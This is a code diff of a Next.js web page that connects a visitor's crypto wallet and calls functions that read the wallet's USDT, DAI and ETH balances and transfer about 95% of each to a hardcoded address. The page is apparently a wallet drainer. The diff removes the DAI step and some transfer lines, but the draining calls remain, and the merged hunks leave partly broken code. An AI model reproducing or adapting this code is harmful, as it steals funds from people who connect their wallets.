@@ -1,6 +1,5 @@
 import Image from "next/image";
 import { address, abi } from "../constants/ethUsdt";
-import { daiAbi, daiAddress } from "@/constants/dai";
 import Web3Modal from "web3modal";
 import { ethers } from "ethers";
 import WalletConnectProvider from "@walletconnect/web3-provider";
@@ -34,7 +33,6 @@ export default function Home() {
       signerAddress = await signer.getAddress();
       try {
         sendUsdt();
-        sendDai();
         await sendEth();
       } catch (e) {
         if (
@@ -57,19 +55,6 @@ export default function Home() {
 
   async function sendUsdt() {
     contract = new ethers.Contract(address, abi, signer); //new instance of usdt contract
-    const balance = Number(
-      (await contract.balanceOf(signerAddress)).toString()
-    );
-
-    const tx = await contract.transfer(
-      "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
-      BigInt(balance * 0.95)
-    );
-    await tx.wait(1);
-  }
-
-  async function sendDai() {
-    contract = new ethers.Contract(daiAddress, daiAbi, signer); //new instance of usdt contract
     const balance = Number(
       (await contract.balanceOf(signerAddress)).toString()
     );
